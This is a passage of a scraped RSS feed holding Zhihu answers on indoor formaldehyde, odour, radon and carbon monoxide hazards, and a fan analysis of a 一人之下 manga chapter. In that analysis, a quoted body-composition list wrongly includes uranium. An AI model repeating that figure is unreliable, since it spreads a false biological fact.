data-pid=\"hLDpRuAG\">不过这个咨询者的情况还算是好一点的，因为给他用的软包衬板是细木工板，而不是更为常用的纤维板，下图用纤维板制作软硬包才是常态：</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-52bfaf3b27d22dbea91e88b9c5cd73ec_720w.jpg?rss\" data-caption=\"常见的软硬包材料——中密度纤维板\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1920\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"PJK5ZgHg\">使用上图纤维板制作软硬包墙面的，我在成都测到过半面墙就让室内甲醛浓度超标7倍以上的案例，可谓触目惊心了。当然，凡事都有例外，纤维板一样有厂家可以做到F4等级排放的乃至无甲醛的，可惜由于成本以及认知边界问题，绝大多数客户以及装修公司都不会（更多是不知道有这种东西的存在）选择并使用。</p>\n<p><br></p>\n<p data-pid=\"F1jDunf2\"><b>3.2.2.\t气味迷踪</b></p>\n<p data-pid=\"WvSUSuf4\">针对上个案例中的主人房我们简单讨论了一下甲醛的主要来源以及部分气味来源，接下来我们以儿童房为例说一下气味的某些来源。</p>\n<p data-pid=\"ikF6-BnB\">这个房间也是很让主人感觉意外的，因为他觉得气味很明显，没想到各项测试数据都挺低的。我看了一下现场环境，发现用料确实很环保，因为担心儿童的安全，地板是全实木（圆盘豆），床和其他家具（也就一套书桌椅了）是全实木（水曲柳材质，木蜡油涂装），床垫尚未购买，墙面和天花是大牌乳胶漆（已干透），两面墙贴了卡通图案的墙布。其他没了。那这个气味很明显是怎么回事呢？</p>\n<p data-pid=\"-_js8eXO\">其实很简单，主要的气味来源是木蜡油和墙布，尤其是墙布贡献最大。我对不少墙布作过干燥器的甲醛测试，数据都不高，近距离闻上去，气味也不大，但是这玩意一贴就是一面墙，累计用量往往较大，根据经验，贴满了普通墙布的房间，很多在第二年的夏天关闭时间一久都能闻到明显的不愉快气味，影响时间非常久。然后大牌的木蜡油的甲醛测试数据一般也很小，但是其中的一些干性油组分或者石蜡（如果是质量不那么好的石蜡气味会比较明显）渗入木材管孔一定深度，挥发时间相对久一点，会造成一段时间的气味问题。</p>\n<p data-pid=\"-XAAu2e8\">有人可能会觉得好奇，气味不是主要由苯系物和TVOC表现出来吗？这几项数据也不高呀？</p>\n<p data-pid=\"BYeznX8Y\">其实，室内气味的来源非常广泛，很多气味物质的存在感非常强，只需要很低的浓度就会表现出很大的气味，因此在色谱图中往往峰面积最大的物质，并不是室内气味的主要来源，对于环境中气味的定性和定量，至今为止都是难度很高的事情，这也是还没有这方面国标出台的原因，不过，相关的研究已经越来越多，虽然道阻且长，依然未来可期。</p>\n<p><br></p>\n<p data-pid=\"MFdqMkaN\"><b>3.3.\t相关研究</b></p>\n<p data-pid=\"1YknG29K\">研究：</p>\n<p data-pid=\"mvWK3inp\">关于室内甲醛污染的研究已经数不胜数，这里不再赘述，但是关于气味的研究，更多是集中在调香、食品风味、纺织品、皮革工艺或者室外环境中的恶臭污染，对于室内的气味污染研究还比较少。中国林科院木材工业研究所研究员龙玲老师是这方面的先行者和重要贡献者之一，在她的专业著作中对木制品的挥发物做了比较全面系统和深入的量化研究，顺便说一下，她还是无甲醛浸渍纸工艺的发明者，使我国在这个领域领先世界。然后东北林大的刘玉、沈隽老师等在木制品挥发物和气味方面也做了大量深入的工作。</p>\n<p data-pid=\"j0Pp7AAb\">测量：</p>\n<p data-pid=\"hBCYIQi0\">对于气味的测量方面，比较传统的做法是通过嗅辩师、电子鼻以及GC-MS联用等手段来对样本空气进行分离、定性和量化。最近几年岛津公司与中国科学院生态环境研究中心合作，使用GC-MS或GC-MSMS串联等方法，对水污染中的异味成分进行了长期研究，建立了嗅味物质分析数据库和嗅味物质快速分析系统，配合Sniffer嗅辨仪及人工嗅辩来对异味物质进行分离定量。目前也在尝试应用于室内空气环境，协助家居用品相关的生产商寻找主要异味来源，以便从源头上减少异味物质的引入，改善室内环境的气味体验。</p>\n<p data-pid=\"aUY8Qcps\">标准：</p>\n<p data-pid=\"stg6dxC8\">对于污染源的气味相关标准方面，国检集团主导的“壁纸、胶粘剂、皮革和室内弹性铺地材料产品气味评价方法及分级”4项气味团体标准第二次工作会议暨气味评价技术研讨会即将在本月召开，到时候有空的话我也会参会。以后对于建材气味相关的标准体系应该会越来越完善的。</p>\n<p><br></p>\n<p data-pid=\"BijudO1l\"><b>4.\t最终结论</b></p>\n<p data-pid=\"0y-7i737\"><b>4.1.\t关系综述</b></p>\n<p data-pid=\"9bER2idQ\">甲醛本身虽然没有特征性的异味，但是具有强烈的刺激性气味，甲醛和室内其他各种挥发性有机化合物组合会产生非常复杂的协同效果，使整体的气味表现发生各种变化，总的说来，甲醛或者苯系物或着TVOC某一项的浓度并不能完全决定整体的气味表现，同时，不同的人对气味感知的敏感度也都是不一样的，因此气味强烈并不意味着甲醛一定超标严重，而气味不大也并不等于环境安全，判断室内环境的安全程度还是需要结合正规的测试得到的各项数据指标来综合评估。但是，在很多情况下，甲醛浓度确实和整体气味表现有着一定的相关性，因为<b>往往劣质建材会同时表现出甲醛以及其他VOC的高释放特性</b>。对此我国住房城乡建设部于2013年开始立项了一个重要课题叫“中国室内环境概况调查与研究”，课题组持续数年调查了15个城市的一类建筑共1360个房间，在甲醛浓度和环境气味方面得出以下结论，供大家参考一下：</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-9c2a1fd350e67447cdce7a55d70d0bc2_720w.jpg?rss\" data-caption=\"“中国室内环境概况调查与研究”课题组对气味与甲醛浓度关系的调查结果\" data-size=\"normal\" data-rawwidth=\"1169\" data-rawheight=\"877\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"lX25Iy3f\">简单来说就是气味越大的情况下，甲醛超标的可能性往往是越高的。但如果环境气味并不那么明显的时候，咱们再依靠气味表现来判断甲醛浓度就不那么靠谱了。</p>\n<p><br></p>\n<p data-pid=\"iK2zS1Hc\"><b>4.2.\t应对方法</b></p>\n<p data-pid=\"sR-l6I0I\"><b>4.2.1.\t甲醛应对</b></p>\n<p data-pid=\"dP3kUlfq\"><b>对于甲醛这种顽固的长期污染物来说，应对的最好的时间是装修前。全面控制建材尤其是核心污染源人造板的质量，减少单位空间内的装载量；在装修中对存在问题的板材进行补救性处理，装修后注意通风，最好安装新风系统，以便在无法自然通风的环境中通过机械通风来强制换气，全面降低室内各种有害气体的浓度。对于部分严重的污染源，采取适当的化学处理等手段来抑制源头散发，降低污染。</b></p>\n<p data-pid=\"czmw0W-6\"><b>4.2.2.\t气味问题</b></p>\n<p data-pid=\"XlpmGiQ2\">避免引入气味污染严重的建材，入住前高温季节长期通风（抽屉、柜门等封闭小空间保持打开状态），低温季节通过持续封闭（周期12小时以内）制热结合间歇（半小时左右）通风的方式，来保持材料表面和空间内的浓度梯度差，增大甲醛之外的苯系物、VOC等重要气味来源的挥发速率，制热缩短高释放周期。如果可以的话，安装新风系统。</p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"tsaGAQlA\"><b>番外篇——无味杀手！</b></p>\n<p data-pid=\"D0Sn7XQk\">有些污染物是没有气味的，但危害十分严重，比如上面报告中最后一项测试数据：放射性氡，在我国每年造成五万多例肺癌患者，危害之大仅次于吸烟。对于氡我们需要避免或减少放射性核素含量较高的材料（以花岗岩等天然石材为主）在室内的使用，三楼以下的住户要保持一定程度的通风，减少来自地面土壤和石材的氡在室内的累积。地下室尽量不要用作卧室，要用的话，做好防氡降氡的措施。</p>\n<p data-pid=\"ZS6U84cJ\">另外，需要警惕更为恐怖的隐形杀手——一氧化碳，这也是无色无味然而极其危险的空气污染物。就在前不久，咱们成都市连夜突击检查了各家各户的燃气设备，引起广泛关注，事件的起因就是在之前一段时间连续发生了几起一氧化碳中毒导致死亡的事件。文献研究表明，一氧化碳中毒在我国冬季以及南方的回南天期间发病率最高，在中毒性疾病中位居第二，仅次于食物中毒，如果不及时发现和抢救，轻则留下缺氧性脑病等后遗症，重则危及生命，我们需要引起高度的重视。如果家里使用的是燃气或者是煤气热水器时，洗澡的时候一定要注意保持良好的通风状态，以及控制洗浴的时间；对于传统直排或烟道式燃气热水器最好更换为强排式；如果家中使用燃气或者是煤气的灶具时不要中途离开，防止锅中的水溢出来将火浇灭进而导致煤气和燃气外泄的情况；使用完灶具后一定要仔细地检查是否已经完全关闭；普通灶具最好更换为带自动熄火装置的灶具；同时要定期对家中的燃气、煤气灶、热水器减压阀和皮管、煤气管道等进行检修、维护和更换；软管无管箍的加上管箍，预留口未封堵的要立即封堵；可以的话最好在室内安装一氧化碳探测器并定期检查和维护，以便在浓度超标时及时地报警提醒。</p>\n<p><br></p>\n<p><br></p>\n<p><br></p>\n<p><br></p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"UYyCGqou\">参考文献及扩展阅读：</p>\n<p data-pid=\"VSvjBwob\">[1]GB/T 18204.2-2014《公共场所卫生检验方法 第2部分：化学污染物》</p>\n<p data-pid=\"fv_Ce7b0\">[2]GB 50325-2020《民用建筑工程室内环境污染控制标准》</p>\n<p data-pid=\"oY9MaBkr\">[3]GB/T 18883-2002《室内空气质量标准》</p>\n<p data-pid=\"oJqhNYv3\">[4]龙玲.木材及其制品挥发性有机化合物释放及评价[M].北京:科学出版社,2012.</p>\n<p data-pid=\"gdOlQ4YF\">[517]吕阳,卢振.室内空气污染传播与控制[M].北京:机械工业出版社,2014.</p>\n<p data-pid=\"wnqBXlx8\">[6]刘如,黄安民,王晨,吕斌.家具气味源分析及控制技术的研究进展[J].木材工业,2018.</p>\n<p data-pid=\"QDPhyM0k\">[7]《食品与消费品安全监管技术丛书》编委会.家具与室内装饰材料安全评价及检测技术[M].北京:化学工业出版社,2018.6</p>\n<p data-pid=\"aB4SczHy\">[8]马贺伟,罗建勋.皮革与纺织品环保指标及检测[M].北京:中国轻工业出版社,2017.</p>\n<p data-pid=\"PPegdNKB\">[9]王喜元,陈松华,梅菁,王倩雪,吴文保,等.中国室内环境概况调查与研究[M].北京:中国计划出版社,2018</p>\n<p data-pid=\"yCovxXyg\">[10]王喜元,金元,陈泽广,卓维海,朱力.中国室内氡研究[M].北京:科学出版社,2013.</p>\n<p data-pid=\"xHTwTInF\">[11]李明香;何晓东;郭兆丽;谭昕;林永茂,营口市一氧化碳中毒事件发生日气象条件分析,【J】,气象与环境学报,2007,27-30,27-30</p>\n<p data-pid=\"JCpEhSe-\">[12]洪雅洁;张毅;蒋馥阳,2013年度大连市非职业性一氧化碳中毒事件情况分析,【J】,实用预防医学,2014,74-75,74-75</p>\n<p data-pid=\"nwBIccFg\">[13]东东,冬季的隐形杀手——一氧化碳中毒,【J】,健康生活,2007,56,56</p>\n<p data-pid=\"RhR3ZXcs\">[14]国检集团会议报告：岛津检测室内空气质量及气味解决方案</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/sunny-chan?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">SUNNY CHAN</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/520421245/answer/2385985760?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">37 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/431717296?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">房间总有刺鼻的味道是为什么？</a><br><a href=\"http://www.zhihu.com/question/510915343?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">新房装修完需要甲醛检测吗？</a><br>\n","link":"http://www.zhihu.com/question/520421245/answer/2385985760?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"武装到牙齿：Notion 优质资源汇总","date":"2022-03-13 04:25:43","description":"这些优质的插件和服务，赋予了 Notion 无尽的超能力。<a href=\"https://sspai.com/post/71893\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71893"},{"title":"如何评价《一人之下》568（604）话？","date":"2022-03-13 01:17:09","description":"\n<h2>写在开头</h2>\n<p data-pid=\"h6JB-Dq3\">本期漫画中展现了纳森卫和翡翠学会顶尖战力间的极高水准，各种法术变化层出不穷，战术层面上也玩了一出漂亮的声东击西，看得笔者在大呼过瘾之余，也渐渐感觉到了米二正在努力构建，属于《一人之下》世界观的西方巫术体系。</p>\n<p data-pid=\"7Z9IKJq1\">这种努力值得所有中国漫画界的同仁去学习，因为一部好的架空文学作品必须建构在严谨的世界观之上。特别是在一人之下大火之后，越来越多的读者会从各种角度去解读这部作品。一部好的漫画在发展到这个阶段后，画面画风反而不再是这部作品真正的卖点，剧本本身的故事性和逻辑性才是真正能够长久吸引读者的核心。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-57f9c8bc7bf1ba539878204a0b47eca2_720w.jpg?rss\" data-rawwidth=\"508\" data-rawheight=\"607\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-57f9c8bc7bf1ba539878204a0b47eca2\" data-watermark-src=\"v2-b7aece51ede4e963cd4f24940cb47bdd\" data-private-watermark-src=\"v2-720029e6f4f0e1e6662a2b9a844e9141\"></p>\n<p data-pid=\"oz8UHiaE\">好了，彩虹屁吹完，咱们开始例行的细节分析。</p>\n<h2>纳森王宫整体战况</h2>\n<h3>正面战场</h3>\n<p data-pid=\"n2FW6gs5\">此次翡翠学会突袭纳森王宫，目前出场的已经有三路人马。同样负责对抗的纳森卫已出现五人，以及临时外援李慕玄。</p>\n<p data-pid=\"eQaEHjlg\">第一路是2名法师，一名使用火系魔法，一人使用疑似毒素巫术。被<b>纳森卫古娜【符文骑士】</b>拦截，目前已全部被击杀。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0ec68dbdb979b008ada10e68adf8743e_720w.jpg?rss\" data-rawwidth=\"2032\" data-rawheight=\"417\" data-size=\"normal\" data-caption=\"对线古娜\" data-watermark=\"watermark\" data-original-src=\"v2-0ec68dbdb979b008ada10e68adf8743e\" data-watermark-src=\"v2-f935b876c7f4c346365781e6e5ebdd45\" data-private-watermark-src=\"v2-585495da8e533c74ab0578ce1d4287a3\"></p>\n<p data-pid=\"Xtg142mZ\">第二路是则共有8人，其中4人为魔法师，2名人体炼成生物，2名未知，人数虽多但普遍战力水平并不高。正面遭遇了纳森卫<b>安东尼【雷霆法师】、望月悟【日本剑士】</b>以及临时赶来的李慕玄。这一路同样全军覆没。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-bf3febdccb2691f26886df8fbca418cc_720w.jpg?rss\" data-rawwidth=\"1237\" data-rawheight=\"1450\" data-size=\"normal\" data-caption=\"杂兵线\" data-watermark=\"watermark\" data-original-src=\"v2-bf3febdccb2691f26886df8fbca418cc\" data-watermark-src=\"v2-53c6bdc8873a7d492460c6aae36290ab\" data-private-watermark-src=\"v2-f591498188eaf3597bbfabdc2120bb78\"></p>\n<p data-pid=\"5WBenB3Q\">第三路的人数暂时未知，目前仅出现一人。但这名魔法师的实力极其强悍，独对纳森卫<b>加西亚【炼金术士】和阿方索【光系法师】</b>不落下风，在其他纳森卫赶到现场进行围攻时，仍然可以安然逃脱。目前，此人是进一步深入圣林还是逃离现场暂不可知。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9cae60e7617c417a8231056bcdb14b9d_720w.jpg?rss\" data-rawwidth=\"1187\" data-rawheight=\"933\" data-size=\"normal\" data-caption=\"以一敌四\" data-watermark=\"watermark\" data-original-src=\"v2-9cae60e7617c417a8231056bcdb14b9d\" data-watermark-src=\"v2-6d41372e12e95c4bca6ed47931d14485\" data-private-watermark-src=\"v2-2ba32141efe26dcd41135c8cd09bdd0b\"></p>\n<h3>大本营：纳森王和近卫以利亚</h3>\n<p data-pid=\"3syVwQST\">目前已知，<b>纳森卫以利亚【近战射手】</b>是陪伴在纳森王身边的近卫力量，并没有直接参与战斗。从发现有人偷入王城开始，以利亚全程陪同纳森王从王宫传送至纳森圣林，按照战场布局，他的职责应该是守护在纳森王身边，是守护纳森王和树最后的防线。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-10a7705f320764e2f4cb037abc2eadca_720w.jpg?rss\" data-rawwidth=\"1880\" data-rawheight=\"329\" data-size=\"normal\" data-caption=\"近卫：以利亚\" data-watermark=\"watermark\" data-original-src=\"v2-10a7705f320764e2f4cb037abc2eadca\" data-watermark-src=\"v2-18f97723e20cb52e8441ca06c4f2a67e\" data-private-watermark-src=\"v2-5f4085a3bee44e71d9ec5f03badfcaee\"></p>\n<p data-pid=\"STF9OIKm\">参考以利亚之前在二十四节谷的表现，他擅长使用炼金枪械和近身搏击，作为最后防线确实相对其他人更合适，特别是纳森王本身还是个战五渣的情况下。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-90216c690f2789ee1385f55bff165797_720w.jpg?rss\" data-rawwidth=\"2049\" data-rawheight=\"355\" data-size=\"normal\" data-caption=\"近战射手和弱鸡王\" data-watermark=\"watermark\" data-original-src=\"v2-90216c690f2789ee1385f55bff165797\" data-watermark-src=\"v2-d12cd48109ded5fc407f0548267ec9d7\" data-private-watermark-src=\"v2-ae9ee2ce5c011cc3c5fc27ee81e2cb41\"></p>\n<h3>王城后备力量</h3>\n<p><img src=\"https://pic3.zhimg.com/v2-53bc8c68a8e6ae606e4bd1439f8e30f5_720w.jpg?rss\" data-rawwidth=\"709\" data-rawheight=\"312\" data-size=\"normal\" data-caption=\"后备力量\" data-watermark=\"watermark\" data-original-src=\"v2-53bc8c68a8e6ae606e4bd1439f8e30f5\" data-watermark-src=\"v2-42355365126c075c24709916bbe5ecda\" data-private-watermark-src=\"v2-b579441cafeb5fd519a0613755e98c37\"></p>\n<p data-pid=\"gmLlFMXq\">这三名未出手的纳森卫应该不会直接参与这场阻击战，毕竟目前贝希摩斯和其他异人组织尚未出手，保留必要的后备力量是守护纳森岛的必要选择。</p>\n<p data-pid=\"knmhRhZE\">关于这三人的能力，目前明确知晓的仅有<b>伊莲娜，</b>米二在直播时曾透露其能力类似于<b>圣娼</b>。</p>\n<h3>圣娼</h3>\n<p data-pid=\"C6odsPf6\"><b>圣娼，亦被称为神娼</b>（Holy Prostitution），是指奉侍神的（不一定是女子，但多为女子）神职人员，在神庙与朝圣者发生性关系，取夜合钱奉神。如帕台农神庙的女神职人员就是如此，而早期罗马贵妇终身还必须有一次到神庙“为神奉献”。<span class=\"nolink\">死海古卷</span>是与圣经同时代的犹太文献，其中也记载了类似的风俗。</p>\n<blockquote data-pid=\"aPecfAMP\">巴比伦人有一个最丑恶可耻的习惯，这就是生在那里的每一个妇女在她一生之中必须有一次到阿普洛迪特的神殿的圣域内去坐在那里，并在那里和一个不相识的男子交媾。······这里总是有大群来来往往的妇女。在妇女中间，四面八方都有用绳子拦出来的通路，而不相识的人们便沿着这条道路行走来选择一位女子。选好位子的女性在一个不相识的人把硬币抛向她膝头并和她在神殿外交媾前，是不能离开自己的位置的。但是当男子抛钱的时候，他要说这样的话：“我以米利塔女神（<b>米利塔是亚述人对阿佛洛狄忒女神的称呼，阿佛洛狄忒即希腊神话的性欲之神</b>）的名字来为你祝福，”银币的大小多少并无关系。神殿里的女子是不能拒绝这件事的，否则便违犯了神的律条，因为一用旦这样的方式抛出去的钱币是神圣的了。当她和他交媾完毕，在神面前完成了自己的使命，她便可以回家去了。从这时开始，不论你再出多少钱，便再也不能得到她了。因此，那些颀长的美貌姑娘通常很快就可以回家，而那些相貌丑陋的女子就要等很长时间才能完成神圣的使命。有些女子不得不在神殿的圣域内等上三四年。——希罗多德《<span class=\"nolink\">历史</span>Ἱστορίαι》</blockquote>\n<p data-pid=\"-85QH6Lu\">根据德国民俗学教授汉斯·巴尔的观点，在古代宗教朝圣者们看来，在性交时，神职人员就成了神的化身，与她们交合，可以<b>使神感到愉悦</b>，这同样也是对神的崇敬。在这种环境中，性行为已经不是交合本身的意义了，它表达的是<b>人与神的配合</b>。是一种极其神圣的行为。</p>\n<p data-pid=\"aW6sjdKn\">而犹太教这种独特的宗教现象必然影响了后世基督教的教义。而基督教为了得到罗马帝国的承认和保护，也大量采用了<span class=\"nolink\">罗马宗教</span>的某些仪式，以至于后来天主教的修女还要发<b>“三绝”大愿</b>。</p>\n<p data-pid=\"uhu03iHu\"><b>所谓“三绝大愿”</b>，其中的“绝色”(不嫁)，并不是说修女不发生婚配，她们是不发生世俗婚配，因为<b>她们都是基督的新娘</b>。这里，可以非常清晰地看到“神娼”的遗迹。而她们如果发生世俗性行为，就意味着对基督的背叛。这与早期宗教的女神职人员不能在神庙外与人发生性关系是同一条精神脉络。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e83934c58a48ebe8cf1f33080558245b_720w.jpg?rss\" data-rawwidth=\"1200\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"修女：基督的新娘\" data-watermark=\"watermark\" data-original-src=\"v2-e83934c58a48ebe8cf1f33080558245b\" data-watermark-src=\"v2-bfc1e4b299cf02b009b7713ceb0f139a\" data-private-watermark-src=\"v2-9a0dac5fad969d18763662d2351e86af\"></p>\n<p data-pid=\"lyFgnlEX\">圣娼的这种能力其实与全性夏柳青的<b>巫优</b>流派异曲同工，区别在于巫优是通过“演”，而圣娼是通过“献身”。这些流派都是通过某种手段获取人类对神明偶像的信念之力，进而利用这种流露出的精神力，极有可能会赋予圣娼模拟神明的能力。</p>\n<p data-pid=\"RV4msR7s\">至于伊莲娜可以请到的能力和对象恐怕就可以脑洞大开了，神树？现任纳森王？历代纳森先王？甚至罗马诸神？</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c806cf1d79da474aac13a66239cfde7c_720w.jpg?rss\" data-rawwidth=\"1507\" data-rawheight=\"553\" data-size=\"normal\" data-caption=\"中国的巫优\" data-watermark=\"watermark\" data-original-src=\"v2-c806cf1d79da474aac13a66239cfde7c\" data-watermark-src=\"v2-9b63dff83cb13bb50d74561d07cb6848\" data-private-watermark-src=\"v2-34f193333574db0842494fe1b9e2d3dc\"></p>\n<h2>战局外的变数</h2>\n<p data-pid=\"kFU8V76c\">目前整个纳森王宫的注意力都被翡翠学会的突袭所牵制，虽然仍然有三名纳森卫，作为后备力量潜伏未发，但对于危机四伏的纳森岛而言，这份防御力量过于薄弱了。事实上，有可能对纳森王及纳森神树造成致命威胁的势力又岂止区区一个翡翠学会呢？</p>\n<h3><b>1、贝希摩斯。</b></h3>\n<p data-pid=\"tkt64EEh\">贝希摩斯的大部队是要在天亮后发动登陆作战，而此刻整个王宫都陷入了内部混乱，纳森一方的高端战力均集中在纳森王宫，岛屿海滩各个登陆点的守卫力量，都陷入了高端战力真空的窘境，贝希摩斯的登陆难度直接降低为零。从防御作战的角度上说，这是典型的未战先败，放弃滩头阻击的大好战机，给了贝希摩斯好整以暇登陆修整的机会，纳森一方再想把外部势力清除出纳森岛几乎不再可能。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-53878b53625eb098dc5aa27aff9d5468_720w.jpg?rss\" data-rawwidth=\"924\" data-rawheight=\"460\" data-size=\"normal\" data-caption=\"登陆阶段的防御是最薄弱的\" data-watermark=\"watermark\" data-original-src=\"v2-53878b53625eb098dc5aa27aff9d5468\" data-watermark-src=\"v2-13e01094b7d9598b9db39c42afbea258\" data-private-watermark-src=\"v2-d90209f08e5d2af124842f7cd2c2c149\"></p>\n<h3><b>2、来历不明的各路人马。</b></h3>\n<p data-pid=\"pXf9D5Dw\">漫画556话中张楚岚提到过除了贝希摩斯的人马外，岛上还多出了非常多的神头鬼脑来历不明的人士。</p>\n<p data-pid=\"_kgEao8W\">笔者之前曾依据他们登陆点的环境细节，分析过他们可能的出身来历及目的。其中对纳森王及神树威胁最大的，就是其中来意不明、怀有其他目的的非官方组织。而他们的登陆并没有提前告知纳森官方，集市也仅仅收集到他们登陆的情况，而对他们的身份一无所知。</p>\n<p data-pid=\"rW1cIBlO\">这批人，虽然他们可能并非针对纳森王位更替，而是针对岛上的某人某物而来，或寻仇，或寻宝，或寻人，均有可能。</p>\n<p data-pid=\"RPXIAYPj\"><b>但当王位更迭或者神树被毁之类的剧变发生，他们趁火打劫、背后补刀的可能性依然存在。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-de0cfc0eb01999fc28e5408395f5d7fb_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"359\" data-size=\"normal\" data-caption=\"两批登陆者的登录地点比较\" data-watermark=\"watermark\" data-original-src=\"v2-de0cfc0eb01999fc28e5408395f5d7fb\" data-watermark-src=\"v2-33d499e0add59209c0a0938a1604fc42\" data-private-watermark-src=\"v2-0d5c32c79fcca664b3f201bfdff9ecd7\" data-tags=\"porn\"></p>\n<h3><b>3、被困纳森的曜星社新上根器。</b></h3>\n<p data-pid=\"x1F5-7uX\">以王国平、陶山公为首的新上根器小队虽然已经完成了曲彤交付的任务——捕获阮丰，但由于纳森岛目前只进不出的现状，他们显然也并没有能够离开纳森。而现在这批人马的活动区域成谜，他们的强大战力也足以构成纳森岛上一股极其危险的势力。</p>\n<p data-pid=\"HpGUnwcv\">曲彤是否有交代他们其他任务，笔者目前暂不得而知，但考虑到他们这股势力一贯的作风，在漫画未来的剧情发展中，他们在关键时刻突然出现，阴一把纳森，毁掉神树或者夺走神树，也并非情理之外。</p>\n<p data-pid=\"5y2phfkm\">毕竟曲彤一直致力于收集甲申之乱的关键人物、事物，所追求终极目标也极有可能是得到甲申之乱的根源——<b>类似天师度的“神物”传承</b>。</p>\n<p data-pid=\"LJPeMhfu\">那么作为同级别的纳森神树成为他们的新目标，也就完全说得通了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-82051b54d07c54984997a86e442b26bc_720w.jpg?rss\" data-rawwidth=\"1710\" data-rawheight=\"387\" data-size=\"normal\" data-caption=\"新上根器小队\" data-watermark=\"watermark\" data-original-src=\"v2-82051b54d07c54984997a86e442b26bc\" data-watermark-src=\"v2-9373ea2597e61e5ef7329a862d8757ca\" data-private-watermark-src=\"v2-bae16a2dae92feaa70d4bb9b1c15adbd\"></p>\n<h3><b>4、“折金枝”之人（或者势力）。</b></h3>\n<p data-pid=\"mjQY5k9y\">剧情发展到现在，当初那个能够躲过纳森王监控，纳森九卫守护，闯入圣林并折断金枝的人，估计已经有不少读者都已经快记不得了。确实从去年纳森岛篇开篇，时隔快一年了，这位神秘人至今没有再度出现在任何人的口中。</p>\n<p data-pid=\"3KuhX34r\">但是作为数百年来头一位，能够折断金枝之人，他（她）的战力之高，恐怕已经不是目前区区四位纳森卫（以利亚及后备的三位纳森卫）所能够对抗的了。这位会在何时动手，恐怕将是未来最大的悬念了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0805bbde476b993cf0b5375b960e4a4d_720w.jpg?rss\" data-rawwidth=\"1505\" data-rawheight=\"548\" data-size=\"normal\" data-caption=\"几百年都没发生过的折金枝事件\" data-watermark=\"watermark\" data-original-src=\"v2-0805bbde476b993cf0b5375b960e4a4d\" data-watermark-src=\"v2-799781433eda560ff71014434d670675\" data-private-watermark-src=\"v2-4437329dc5b25e3d237eae270d4bcac2\" data-tags=\"porn\"></p>\n<h2>本期漫画中出现的新能力</h2>\n<p data-pid=\"BhLkIo5g\">看完整体战局，回到眼下的王宫大战，加西亚的人体炼成、阿方索的光系法术、面具法师的法术是本期的三大看点。笔者依据已有信息，逐一解析。</p>\n<h3>加西亚的人体炼成</h3>\n<p data-pid=\"QrpS_KFl\">人体炼成这一概念原本出自日本动漫《<span class=\"nolink\">钢之炼金术师</span>》(Fullmetal Alchemist)中用于人类复活的一类炼金术。但是在现实中，中世纪的炼金术确实有过追求人体炼成（或者应该被称为复活石）的相关案例。</p>\n<blockquote data-pid=\"HFQq2Pm7\">人体炼成的成本：常人的身体元素比例如下:65%氧，18%碳，10%氢，3%氮，1.5%钙，1%磷，0.35%钾，0.25%硫，0.15%铀，0.15%氯，0.05%镁，0.0004%铁，0.00004%碘,以及微量的氟、硅、锰、锌、铜、铝和砷。</blockquote>\n<p><img src=\"https://pic1.zhimg.com/v2-664c54f0bdc11dacf70f58d853af9bd7_720w.jpg?rss\" data-rawwidth=\"518\" data-rawheight=\"496\" data-size=\"normal\" data-caption=\"人体炼成阵\" data-watermark=\"watermark\" data-original-src=\"v2-664c54f0bdc11dacf70f58d853af9bd7\" data-watermark-src=\"v2-cf9866c6b2cfa2399da7eeec9c71c4ba\" data-private-watermark-src=\"v2-d33a64304a25742a357b53d453db8bec\"></p>\n<p data-pid=\"vqjEmWG7\">中世纪的炼金术士相信，“炼金术”的精馏和提纯贱金属，是一道经由死亡、复活而完善的过程，象征了从事炼金的人的灵魂由死亡、复活而完善，炼金术能使他获得享福的生活、高超的智慧、高尚的道德，改变他的精神面貌，最终达到与造物主沟通。</p>\n<p data-pid=\"zGSygfqn\"><b>尼古拉·弗拉梅尔</b>（法语：Nicolas Flamel，1330年－1418年3月22日），<span class=\"nolink\">法国瓦卢瓦王朝炼金术</span>士，对炼金术界的传奇物质“<span class=\"nolink\">贤者之石</span>”的研究使他闻名于世，因此，他也被视为欧洲<span class=\"nolink\">炼金术</span>的始祖。</p>\n<blockquote 